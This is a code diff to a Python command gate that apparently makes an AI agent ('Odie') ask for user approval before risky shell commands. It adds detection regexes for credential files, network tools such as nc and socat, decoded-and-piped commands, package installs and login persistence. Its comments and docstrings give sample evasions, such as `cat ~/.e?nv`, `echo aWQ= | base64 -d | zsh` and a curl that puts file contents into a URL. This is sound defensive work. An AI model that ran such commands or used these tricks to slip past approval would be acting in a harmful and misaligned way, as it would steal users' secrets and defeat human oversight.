@@ -26,6 +26,7 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
     ("reads secrets", re.compile(
         r"\.env\b|\.netrc|\.ssh\b|id_rsa|id_ed25519|\.pem\b|keychain|security\s+find-|_PAT\b|_KEY\b|_TOKEN\b|SECRET|"
         r"PASSWORD|passwd|credential|auth\.json|token\.json|client_secret|\.(zshrc|zshenv|zprofile|bashrc|bash_profile|profile)\b|"
+        r"\.aws\b|\.npmrc|\.pypirc|\.gnupg|\.kube\b|\.docker/config|hosts\.yml|\.gitconfig|cookies|"
         r"(^|[;&|(]\s*)(env|printenv)\b", re.IGNORECASE)),
     ("deletes or stops something", re.compile(
         r"(^|[;&|(`]\s*|\s)(rm|rmdir|kill|pkill|killall|sudo|chmod|chown|dd|mkfs|shutdown|reboot|launchctl|truncate|"
@@ -33,12 +34,47 @@ _RULES: list[tuple[str, re.Pattern[str]]] = [
         r"\bos\.(remove|unlink|rmdir|kill)\b|\bshutil\.(rmtree|move)\b|\.unlink\(|\.rmdir\(|"
         r"\.(rm|rmSync|unlinkSync|rmdirSync)\(|\bsubprocess\b|\bos\.system\b|child_process")),
     ("sends data out", re.compile(
-        r"\bcurl\b[^|;]*(-X\s*(POST|PUT|PATCH|DELETE)|--data|\s-d\s|\s-F\s|--form|\s-T\s|--upload)|\bwget\b[^|;]*--post|"
-        r"\b(scp|ssh|ftp|sftp|nc|ncat|sendmail)\b|\brsync\b[^|;]*\S+:|"
+        r"\bcurl\b[^|;]*(-X\s*(POST|PUT|PATCH|DELETE)|--data|\s-d\s|\s-F\s|--form|\s-T\s|--upload|\s-K\s|--config)|\bwget\b[^|;]*--post|"
+        r"\b(scp|ssh|ftp|sftp|nc|ncat|sendmail|telnet|socat)\b|\brsync\b[^|;]*\S+:|"
         r"\brequests\.(post|put|patch|delete)\b|\bhttpx\.(post|put|patch|delete)\b|\bsmtplib\b|"
         r"method\s*:\s*['\"](POST|PUT|PATCH|DELETE)")),
+    # An address built at run time carries whatever was put into it: curl 'https://x/?d='$(cat f), wget "$URL$DATA",
+    # requests.get(base + secret), urlopen(f"...{key}"). Only a fixed address is a plain read.
+    ("sends data out (an address built from other text)", re.compile(
+        r"\b(curl|wget|xh|aria2c|nc|openssl\s+s_client)\b[^|;&\n]*(\$\(|`|\$\{?[A-Za-z_])|"
+        r"\b(requests\.(get|head)|httpx\.(get|head)|urlopen|urlretrieve|fetch|axios\.get|http\.get|https\.get)\s*\([^)]*"
+        r"(\+|\bf['\"]|\.format\(|%\s*\(|\$\{|`)")),
+    # Text that is data until it's decoded or piped: `echo <base64> | base64 -d | zsh` shows no command until it runs.
+    ("runs text as commands", re.compile(
+        r"\|\s*(sudo\s+)?(sh|bash|zsh|dash|fish|ksh|python3?|node|ruby|perl|osascript|xargs|source|eval|exec)\b|"
+        r"\b(eval|exec)\s+[\"'$`(]|\bsource\s+\S|(^|[;&|(]\s*)\.\s+\S|"
+        r"\bbase64\b[^|;\n]*(\s-[dD]\b|--decode)|\bxxd\s+-r|\bopenssl\s+(enc\s+-d|base64\s+-d)|\buudecode\b|\\x[0-9a-fA-F]{2}|"
+        r"\bexec\(|\bcompile\(|__import__\(|\bimportlib\b|\bnew\s+Function\(|\bvm\.run")),
+    # What the owner's choice lets inline code do stops at writing files it couldn't write from the shell (unsafe_write
+    # sees only > redirections): python3 -c "open(p, 'w')" is a write like any other.
+    ("writes a file from code", re.compile(
+        r"\bopen\s*\([^,)]*,\s*(mode\s*=\s*)?['\"][rb]*[wax+][rwaxb+]*['\"]|\bopen\s*\([^)]*mode\s*=\s*['\"][rb]*[wax+]|\.write_(text|bytes)\(|\bwriteFile(Sync)?\(|\bappendFile(Sync)?\(|"
+        r"\bfs\.\w*[wW]rite|\bFile\.(write|open)\(|\bIO\.write\(|\bplistlib\.dump|"
+        r"\bshutil\.(copy|copyfile|copytree|copy2)\b|\bos\.(rename|replace|symlink|link)\b|\bPath\([^)]*\)\.(rename|replace|symlink_to)")),
+    # Things that run again later, or at login: a command that ends now can't be read later.
+    ("sets something to run later or at login", re.compile(
+        r"LaunchAgents|LaunchDaemons|loginwindow|login\s+item|\bdefaults\s+write\b|\bat\s+now|\bcron\b|\bsystemctl\b|"
+        r"/etc/(rc|profile|paths|hosts|sudoers)|\bscreen\s+-dm|"
+        r"\btmux\s+new\b", re.IGNORECASE)),
+    # Installing a package runs its install scripts: npm's postinstall, pip's setup.py, brew's formula.
+    ("installs software (runs its install scripts)", re.compile(
+        r"\b(npm|pnpm|yarn|bun)\s+(i|install|add|ci|up|update|upgrade|exec|x)\b|\bnpx\b|\bpip3?\s+(install|download)\b|"
+        r"\buv\s+(pip\s+install|add|tool\s+(install|run))\b|\buv\s+run\b[^|;&\n]*--with\b|\buvx\b|\bpipx\b|\bbrew\s+(install|upgrade|tap|reinstall)\b|"
+        r"\bgem\s+install\b|\bcargo\s+install\b|\bgo\s+(install|get|run)\b|\bconda\s+install\b|\bport\s+install\b|"
+        r"\bcurl\b[^|;\n]*\|\s*(sh|bash|zsh)|\binstaller\s+-pkg|\bopen\s+\S+\.(dmg|pkg|app)\b")),
     ("edits files in place", re.compile(r"\b(sed|perl)\s+(-\w*\s+)*-i|\btee\b")),
 ]
+# A path into a hidden folder or file under the home folder (~/.ssh, $HOME/.config, /Users/me/.zshrc), as the shell
+# sees it before globbing.
+_HIDDEN_PATH = re.compile(r"(~|\$HOME|\$\{HOME\}|/Users/[^/\s'\"]+|/home/[^/\s'\"]+)/\.[^\s;&|<>]*")
+_GLOBBED = re.compile(r"[?*\[\]{}]|\$\(|`|\$\{?[A-Za-z_]")  # a pattern or a substitution: the real name is decided at run time
+_ONE_OF = re.compile(r"\[(.)\]")  # [v]: a glob that matches exactly that one character
+_SQUEEZE = re.compile(r"[\\'\"?*]")  # quotes, backslashes and one-character globs that spell a word around a rule
 _REDIRECT = re.compile(r"\d?>>?\s*(&\d*|'[^']*'|\"[^\"]*\"|[^\s;&|<>]+)")
 _HEREDOC = re.compile(r"<<-?\s*(['\"]?)(\w+)\1")
 _INTERPRETER = re.compile(r"\b(python3?|node|ruby|perl|osascript|bash|sh|zsh|deno|bun)\b")
@@ -156,18 +192,52 @@ def unsafe_write(shell: str, safe_dirs: tuple[str, ...], cwd: str | None) -> boo
     return False
 
 
+def squeezed(text: str) -> str:
+    """The text with the spelling tricks taken out, so a rule's word still matches: quotes and backslashes inside a word
+    (`cat ~/."env"`, `cat ~/.\\env`), and one-character globs (`cat ~/.e?nv`, `cat ~/.en[v]`) that make the shell find
+    the file the rule names. `cat ~/.e?nv` -> "cat ~/.env"; `ls ~/Downloads` -> unchanged."""
+    return _SQUEEZE.sub("", _ONE_OF.sub(r"\1", text))
+
+
+def hidden_path_by_pattern(shell: str, safe_dirs: tuple[str, ...] = ()) -> bool:
+    """Whether the shell text reaches a hidden file or folder under the home folder by a pattern or a substitution the
+    shell fills in at run time, so the rules can't read the real name. A pattern whose fixed part is already inside a
+    safe place (Odie's workspace, under ~/.odie) is fine: it can only name files there.
+    `cat ~/.{e,x}nv` -> True; `ls ~/.odie/*` -> True; `cat ~/.$(echo e)nv` -> True; `cat ~/.agentd/profiles/x/SKILL.md`
+    -> False (a plain name, judged by the rules); `ls ~/Downloads/*.pdf` -> False (not hidden);
+    `ls ~/.odie/workspace/*.md` with the workspace safe -> False."""
+    home = os.path.realpath(os.path.expanduser("~"))
+    for path in _HIDDEN_PATH.finditer(shell):
+        text = path.group(0)
+        pattern = _GLOBBED.search(text)
+        if pattern is None:
+            continue
+        fixed_part = text[:pattern.start()]
+        if is_safe_place(_expanded(fixed_part, home), safe_dirs):
+            continue
+        return True
+    return False
+
+
 def always_ask(command: str, safe_dirs: tuple[str, ...] = (), cwd: str | None = None) -> str | None:
     """Why this command must be tapped even under a grant, or None if a grant covers it. The rules read the shell
-    text and any code fed to an interpreter (split_heredocs); file writes are judged from the shell text, with Odie's
-    workspace and the vault (`safe_dirs`) as safe as /tmp. Examples: `ls ~/Downloads` -> None; `rm old.txt` ->
-    "deletes or stops something"; `echo hi > /tmp/x` -> None; `echo hi > notes.txt` -> "writes a file outside /tmp";
-    `python3 -c "import PIL"` -> None; `python3 -c "import shutil; shutil.rmtree(p)"` -> "deletes or stops
-    something"."""
+    text and any code fed to an interpreter (split_heredocs), as written and with spelling tricks squeezed out
+    (squeezed); a hidden path reached by a pattern asks (hidden_path_by_pattern); file writes are judged from the
+    shell text, with Odie's workspace and the vault (`safe_dirs`) as safe as /tmp. The rules can't read every shell
+    (a script written to the workspace and then run is its own code): they close the ways a command hides what it
+    does, not every command. Examples: `ls ~/Downloads` -> None; `rm old.txt` -> "deletes or stops something";
+    `echo hi > /tmp/x` -> None; `echo hi > notes.txt` -> "writes a file outside /tmp"; `python3 -c "import PIL"` -> None;
+    `python3 -c "import shutil; shutil.rmtree(p)"` -> "deletes or stops something"; `echo aWQ= | base64 -d | zsh` ->
+    "runs text as commands"; `cat ~/.e?nv` -> "reads secrets"; `npm install left-pad` -> "installs software (runs its
+    install scripts)"; `curl 'https://x/?d='$(cat f)` -> "sends data out (an address built from other text)"."""
     shell, code = split_heredocs(command)
     looked_at = f"{shell}\n{code}"
-    for why, rule in _RULES:
-        if rule.search(looked_at):
-            return why
+    for text in (looked_at, squeezed(looked_at)):
+        for why, rule in _RULES:
+            if rule.search(text):
+                return why
+    if hidden_path_by_pattern(shell, safe_dirs):
+        return "reaches a hidden file by a pattern"
     if unsafe_write(shell, safe_dirs, cwd):
         return "writes a file outside /tmp"
     return None
